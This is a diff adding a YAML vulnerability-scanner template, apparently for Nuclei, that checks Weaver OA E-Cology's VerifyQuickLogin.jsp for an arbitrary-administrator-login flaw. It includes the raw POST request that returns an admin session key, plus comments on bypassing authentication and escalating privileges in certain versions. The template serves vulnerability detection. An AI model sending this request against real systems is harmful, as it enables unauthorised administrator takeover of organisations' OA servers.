@@ -1,0 +1,35 @@
+id: fanweiOA-E-Cology-VerifyQuickLogin_jsp-admin-login-sessionkey
+
+info:
+  name: 泛微OA E-Cology VerifyQuickLogin.jsp 任意管理员登录漏洞
+  severity: medium
+  author: cnaq
+  description: 泛微OA E-Cology VerifyQuickLogin.jsp文件中存在任意管理员登录漏洞，攻击着通过发送特殊的请求包可以获取管理员Session
+  reference:
+    - http://wiki.peiqi.tech/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Cology%20VerifyQuickLogin.jsp%20%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E.html
+    - https://forum.butian.net/share/1810
+  tags: fanwei,oa,ecology,login
+
+
+requests:
+  - raw:
+      - |
+        POST /mobile/plugin/VerifyQuickLogin.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        identifier=1&language=1&ipaddress=
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          
+      - type: word
+        part: body
+        words:
+          - 'sessionkey'
+
+# 1.低版本的ecology中未修复Api绕过鉴权的方法，可以使用该方法绕过鉴权访问到接口，从而实现未授权访问get admin
+# 2.修复Api绕过鉴权后的版本~v10.48之间，可以用低权限用户调用该接口，实现用户提权，获得管理员权限。
